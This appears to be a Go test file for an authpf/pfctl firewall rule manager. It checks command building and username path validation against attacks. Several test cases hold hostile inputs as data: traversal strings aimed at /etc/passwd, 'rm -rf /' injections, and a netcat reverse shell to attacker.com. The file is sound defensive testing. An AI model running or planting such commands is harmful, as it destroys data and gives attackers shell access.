package main

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/stretchr/testify/assert"
)

// MockedExecuteSystemCommand stores the mock implementation
var mockedExecuteSystemCommand func(command string, args ...string) *SystemCommandResult

// executeSystemCommandForTest wraps the real function but allows mocking
func executeSystemCommandForTest(command string, args ...string) *SystemCommandResult {
	if mockedExecuteSystemCommand != nil {
		return mockedExecuteSystemCommand(command, args...)
	}
	return executeSystemCommand(command, args...)
}

// TestExecuteSystemCommandMocked tests command execution with mocking
func TestExecuteSystemCommandMocked(t *testing.T) {
	// Save original mock
	originalMock := mockedExecuteSystemCommand
	defer func() { mockedExecuteSystemCommand = originalMock }()

	// Set up mock
	mockedExecuteSystemCommand = func(command string, args ...string) *SystemCommandResult {
		return &SystemCommandResult{
			Command:  command,
			Args:     args,
			Stdout:   "mocked output",
			Stderr:   "",
			ExitCode: 0,
			Error:    nil,
		}
	}

	result := executeSystemCommandForTest("echo", "test")

	if result.Command != "echo" {
		t.Errorf("expected command 'echo', got %q", result.Command)
	}
	if result.ExitCode != 0 {
		t.Errorf("expected exit code 0, got %d", result.ExitCode)
	}
	if result.Stdout != "mocked output" {
		t.Errorf("expected mocked output, got %q", result.Stdout)
	}
}

// TestExecuteSystemCommandMockedError tests error handling with mocking
func TestExecuteSystemCommandMockedError(t *testing.T) {
	originalMock := mockedExecuteSystemCommand
	defer func() { mockedExecuteSystemCommand = originalMock }()

	// Mock command failure
	mockedExecuteSystemCommand = func(command string, args ...string) *SystemCommandResult {
		return &SystemCommandResult{
			Command:  command,
			Args:     args,
			Stdout:   "",
			Stderr:   "command not found",
			ExitCode: -1,
			Error:    fmt.Errorf("command not found"),
		}
	}

	result := executeSystemCommandForTest("/nonexistent/command")

	if result.ExitCode != -1 {
		t.Errorf("expected exit code -1, got %d", result.ExitCode)
	}
	if result.Error == nil {
		t.Errorf("expected error, got nil")
	}
}

// TestBuildPfctlCmd tests pfctl command prefix building
func TestBuildPfctlCmd(t *testing.T) {
	originalConfig := config
	defer func() { config = originalConfig }()

	tests := []struct {
		name           string
		elevatorMode   string
		pfctlBinary    string
		expectedPrefix string
	}{
		{
			name:           "default pfctl binary",
			elevatorMode:   "",
			pfctlBinary:    "/sbin/pfctl",
			expectedPrefix: "/sbin/pfctl",
		},
		{
			name:           "sudo elevator mode",
			elevatorMode:   "sudo",
			pfctlBinary:    "/sbin/pfctl",
			expectedPrefix: "sudo",
		},
		{
			name:           "doas elevator mode",
			elevatorMode:   "doas",
			pfctlBinary:    "/sbin/pfctl",
			expectedPrefix: "doas",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			config.Server.ElevatorMode = tt.elevatorMode
			config.Defaults.PfctlBinary = tt.pfctlBinary

			result := buildPfctlCmd()

			if result != tt.expectedPrefix {
				t.Errorf("expected %q, got %q", tt.expectedPrefix, result)
			}
		})
	}
}

// TestBuildAuthPFAnchorPath tests path building with security checks
func TestBuildAuthPFAnchorPath(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	tests := []struct {
		name        string
		username    string
		expectError bool
		errorMsg    string
	}{
		{
			name:        "valid username",
			username:    "testuser",
			expectError: false,
		},
		{
			name:        "empty username",
			username:    "",
			expectError: true,
			errorMsg:    "username cannot be empty",
		},
		{
			name:        "username with invalid characters",
			username:    "test@user",
			expectError: true,
			errorMsg:    "invalid characters",
		},
		{
			name:        "username too long",
			username:    strings.Repeat("a", 256),
			expectError: true,
			errorMsg:    "too long",
		},
		{
			name:        "non-existent user",
			username:    "nonexistent",
			expectError: true,
			errorMsg:    "not found",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := buildAuthPFAnchorPath(tt.username)

			if tt.expectError {
				if err == nil {
					t.Errorf("expected error, got nil")
				}
				if tt.errorMsg != "" && !strings.Contains(err.Error(), tt.errorMsg) {
					t.Errorf("expected error containing %q, got: %v", tt.errorMsg, err)
				}
			} else {
				if err != nil {
					t.Errorf("unexpected error: %v", err)
				}
				if result == "" {
					t.Errorf("expected non-empty path")
				}
			}
		})
	}
}

// TestBuildAuthPFAnchorPathTraversal tests path traversal attack prevention
func TestBuildAuthPFAnchorPathTraversal(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	tests := []struct {
		name     string
		username string
	}{
		{
			name:     "path traversal with ../",
			username: "testuser/../../../etc/passwd",
		},
		{
			name:     "path traversal with absolute path",
			username: "/etc/passwd",
		},
		{
			name:     "path traversal with encoded ../",
			username: "testuser%2F..%2F..%2Fetc%2Fpasswd",
		},
		{
			name:     "path traversal with null byte",
			username: "testuser\x00../../../etc/passwd",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := buildAuthPFAnchorPath(tt.username)

			// All path traversal attempts should fail validation
			if err == nil {
				t.Errorf("expected path traversal detection error, got nil")
			}

			if result != "" {
				t.Errorf("expected empty path for traversal attempt, got: %s", result)
			}

			if err != nil && !strings.Contains(err.Error(), "path traversal") && !strings.Contains(err.Error(), "invalid characters") {
				t.Logf("error message: %v", err)
			}
		})
	}
}

// TestBuildAuthPFAnchorPathSymlinkAttack tests symlink attack prevention
func TestBuildAuthPFAnchorPathSymlinkAttack(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	// Create a symlink pointing outside the base directory
	targetDir := t.TempDir()
	symlinkPath := filepath.Join(tmpDir, "testuser")
	err := os.Symlink(targetDir, symlinkPath)
	if err != nil {
		t.Skipf("cannot create symlink: %v", err)
	}

	result, err := buildAuthPFAnchorPath("testuser")

	// The path should be within the base directory after resolution
	if err != nil {
		t.Logf("symlink handling error: %v", err)
	}

	if result != "" {
		absResult, _ := filepath.Abs(result)
		absBase, _ := filepath.Abs(tmpDir)
		if !strings.HasPrefix(absResult, absBase) {
			t.Errorf("symlink attack: path %s is outside base %s", absResult, absBase)
		}
	}
}

// TestBuildAuthPFAnchorPathBoundaryCheck tests that paths are properly bounded
func TestBuildAuthPFAnchorPathBoundaryCheck(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"validuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	result, err := buildAuthPFAnchorPath("validuser")

	if err != nil {
		t.Fatalf("unexpected error: %v", err)
	}

	absResult, _ := filepath.Abs(result)
	absBase, _ := filepath.Abs(tmpDir)

	if !strings.HasPrefix(absResult, absBase) {
		t.Errorf("path %s is not within base directory %s", absResult, absBase)
	}
}

// TestBuildPfctlActivateCmdParameters tests pfctl command parameter building
func TestBuildPfctlActivateCmdParameters(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.AnchorName = "authpf"
	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	tests := []struct {
		name           string
		rule           AuthPFAnchor
		mode           string
		expectedParams int
	}{
		{
			name: "activate mode",
			rule: AuthPFAnchor{
				Username: "testuser",
				UserIP:   "192.168.1.100",
				UserID:   1000,
			},
			expectedParams: 8, // -a anchor -D user_ip -D user_id -f rulePath
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := buildPfctlActivateCmdParameters(tt.rule)

			if len(result) != tt.expectedParams {
				t.Errorf("expected %d parameters, got %d: %v", tt.expectedParams, len(result), result)
			}

			if len(result) > 0 && result[0] == "-a" {
				if len(result) > 1 && !strings.Contains(result[1], "authpf") {
					t.Errorf("expected anchor in parameters, got: %s", result[1])
				}
			}
		})
	}
}

// TestBuildPfctlCmdParametersCommandInjection tests command injection prevention
func TestBuildPfctlCmdParametersCommandInjection(t *testing.T) {
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.AnchorName = "authpf"
	config.AuthPF.UserRulesRootFolder = "/tmp/rules"
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	tests := []struct {
		name     string
		username string
		userIP   string
		userID   int
	}{
		{
			name:     "command injection in username",
			username: "testuser; rm -rf /",
			userIP:   "192.168.1.100",
			userID:   1000,
		},
		{
			name:     "command injection in IP",
			username: "testuser",
			userIP:   "192.168.1.100; nc -e /bin/sh attacker.com 4444",
			userID:   1000,
		},
		{
			name:     "pipe injection",
			username: "testuser",
			userIP:   "192.168.1.100 | cat /etc/passwd",
			userID:   1000,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := AuthPFAnchor{
				Username: tt.username,
				UserIP:   tt.userIP,
				UserID:   tt.userID,
			}

			result := buildPfctlActivateCmdParameters(rule)

			// Check that parameters don't contain shell metacharacters that could be interpreted
			for _, param := range result {
				if strings.Contains(param, ";") || strings.Contains(param, "|") || strings.Contains(param, "&") {
					// These should only appear in the rule file path, not in command parameters
					if !strings.HasPrefix(param, "/") {
						t.Logf("warning: potential injection in parameter: %s", param)
					}
				}
			}
		})
	}
}

// TestBuildPfctlDeactivateCmdParameters tests multi-command parameter building
func TestBuildPfctlDeactivateCmdParameters(t *testing.T) {
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.AnchorName = "authpf"
	config.AuthPF.FlushFilter = []string{"nat", "queue", "ethernet", "rules", "states", "info", "Sources", "Reset"}

	tests := []struct {
		name          string
		mode          string
		expectedCount int
	}{
		{
			name:          "deactivate mode",
			expectedCount: 8, // nat, queue, ethernet, rules, states, info, Sources, Reset
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := AuthPFAnchor{
				Username: "testuser",
				UserID:   1000,
			}

			result := buildPfctlDeactivateCmdParameters(rule)

			if len(result) != tt.expectedCount {
				t.Errorf("expected %d commands, got %d", tt.expectedCount, len(result))
			}
		})
	}
}

// TestBuildAuthPFAnchorPathWithSpecialCharacters tests handling of special characters
func TestBuildAuthPFAnchorPathWithSpecialCharacters(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	tests := []struct {
		name     string
		username string
		valid    bool
	}{
		{
			name:     "username with hyphen",
			username: "test-user",
			valid:    true,
		},
		{
			name:     "username with underscore",
			username: "test_user",
			valid:    true,
		},
		{
			name:     "username with space",
			username: "test user",
			valid:    false,
		},
		{
			name:     "username with dot",
			username: "test.user",
			valid:    false,
		},
		{
			name:     "username with special chars",
			username: "test$user",
			valid:    false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// Add user to config if valid
			if tt.valid {
				config.Rbac.Users[tt.username] = ConfigFileRbacUsers{
					Password: "test",
					Role:     "user",
					UserID:   1000,
				}
			}

			result, err := buildAuthPFAnchorPath(tt.username)

			if tt.valid {
				if err != nil {
					t.Errorf("expected no error for valid username, got: %v", err)
				}
				if result == "" {
					t.Errorf("expected non-empty path for valid username")
				}
			} else {
				if err == nil {
					t.Errorf("expected error for invalid username")
				}
			}
		})
	}
}

// TestBuildAuthPFAnchorPathRaceCondition tests for race conditions
func TestBuildAuthPFAnchorPathRaceCondition(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	// Run multiple concurrent calls
	done := make(chan bool, 10)
	for i := 0; i < 10; i++ {
		go func() {
			result, err := buildAuthPFAnchorPath("testuser")
			if err != nil {
				t.Errorf("unexpected error: %v", err)
			}
			if result == "" {
				t.Errorf("expected non-empty path")
			}
			done <- true
		}()
	}

	// Wait for all goroutines
	for i := 0; i < 10; i++ {
		<-done
	}
}

// TestBuildAuthPFAnchorPathDoubleEncoding tests double encoding attacks
func TestBuildAuthPFAnchorPathDoubleEncoding(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	tests := []struct {
		name     string
		username string
	}{
		{
			name:     "double encoded traversal",
			username: "testuser%252F..%252F..%252Fetc%252Fpasswd",
		},
		{
			name:     "unicode encoded traversal",
			username: "testuser\\u002f..\\u002f..\\u002fetc\\u002fpasswd",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result, err := buildAuthPFAnchorPath(tt.username)

			// Should fail validation due to invalid characters
			if err == nil {
				t.Errorf("expected error for encoded traversal attempt")
			}

			if result != "" {
				t.Errorf("expected empty path for encoded traversal attempt")
			}
		})
	}
}

// TestBuildAuthPFAnchorPathCaseInsensitivity tests case handling
func TestBuildAuthPFAnchorPathCaseInsensitivity(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
		"TestUser": {
			Password: "test",
			Role:     "user",
			UserID:   1001,
		},
	}

	result1, err1 := buildAuthPFAnchorPath("testuser")
	result2, err2 := buildAuthPFAnchorPath("TestUser")

	if err1 != nil || err2 != nil {
		t.Fatalf("unexpected errors: %v, %v", err1, err2)
	}

	// Paths should be different for different users
	if result1 == result2 {
		t.Errorf("expected different paths for different users")
	}
}

// TestBuildPfctlCmdParametersIPValidation tests IP parameter handling
func TestBuildPfctlCmdParametersIPValidation(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.AnchorName = "authpf"
	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	tests := []struct {
		name   string
		userIP string
		want   string
	}{
		{
			name:   "valid IPv4",
			userIP: "192.168.1.100",
			want:   "user_ip=192.168.1.100",
		},
		{
			name:   "valid IPv6",
			userIP: "2001:db8::1",
			want:   "user_ip=2001:db8::1",
		},
		{
			name:   "IP with command injection attempt",
			userIP: "192.168.1.100; cat /etc/passwd",
			want:   "",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule := AuthPFAnchor{
				Username: "testuser",
				UserIP:   tt.userIP,
				UserID:   1000,
			}

			result := buildPfctlActivateCmdParameters(rule)

			// Verify that the IP is passed as a parameter, not executed
			found := false

			if len(result) == 0 && tt.want == "" {
				found = true
			}

			if len(result) > 3 && tt.want != "" {
				if strings.Contains(result[3], tt.want) {
					found = true
					if strings.Contains(result[3], ";") && !strings.HasPrefix(result[3], "user_ip=") {
						t.Logf("warning: potential injection in IP parameter: %s", result[3])
					}
				}
			}

			if !found {
				t.Errorf("expected user_ip parameter in result")
			}
		})
	}
}

// TestBuildAuthPFAnchorPathNullByteInjection tests null byte injection prevention
func TestBuildAuthPFAnchorPathNullByteInjection(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	// Null byte injection attempt
	username := "testuser\x00"
	result, err := buildAuthPFAnchorPath(username)

	if err == nil {
		t.Errorf("expected error for null byte injection")
	}

	if result != "" {
		t.Errorf("expected empty path for null byte injection")
	}
}

// TestBuildAuthPFAnchorPathBacktrackingLimit tests excessive backtracking prevention
func TestBuildAuthPFAnchorPathBacktrackingLimit(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	// Create a username with many backtracking attempts
	username := "testuser" + strings.Repeat("/../", 100)
	result, err := buildAuthPFAnchorPath(username)

	if err == nil {
		t.Errorf("expected error for excessive backtracking")
	}

	if result != "" {
		t.Errorf("expected empty path for excessive backtracking")
	}
}

// TestBuildPfctlCmdParametersAnchorNameInjection tests anchor name parameter safety
func TestBuildPfctlCmdParametersAnchorNameInjection(t *testing.T) {
	tmpDir := t.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.AnchorName = "authpf; rm -rf /"
	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	rule := AuthPFAnchor{
		Username: "testuser",
		UserIP:   "192.168.1.100",
		UserID:   1000,
	}

	result := buildPfctlActivateCmdParameters(rule)

	// The anchor name should be passed as a single parameter
	if len(result) > 0 && result[0] != "-a" {
		t.Errorf("expected -a flag as first parameter")
	}

	if len(result) > 1 {
		anchor := result[1]
		// Anchor should contain the malicious string but be passed as a parameter, not executed
		if strings.Contains(anchor, "authpf") {
			t.Logf("anchor parameter: %s", anchor)
		}
	}
}

// BenchmarkBuildAuthPFAnchorPath benchmarks path building
func BenchmarkBuildAuthPFAnchorPath(b *testing.B) {
	tmpDir := b.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	for b.Loop() {
		_, err := buildAuthPFAnchorPath("testuser")
		assert.NoError(b, err)
	}
}

// BenchmarkBuildPfctlCmdParameters benchmarks command parameter building
func BenchmarkBuildPfctlCmdParameters(b *testing.B) {
	tmpDir := b.TempDir()
	originalConfig := config
	defer func() { config = originalConfig }()

	config.AuthPF.AnchorName = "authpf"
	config.AuthPF.UserRulesRootFolder = tmpDir
	config.AuthPF.UserRulesFile = "rules"
	config.Rbac.Users = map[string]ConfigFileRbacUsers{
		"testuser": {
			Password: "test",
			Role:     "user",
			UserID:   1000,
		},
	}

	rule := AuthPFAnchor{
		Username: "testuser",
		UserIP:   "192.168.1.100",
		UserID:   1000,
	}

	b.ResetTimer()
	for i := 0; i < b.N; i++ {
		buildPfctlActivateCmdParameters(rule)
	}
}
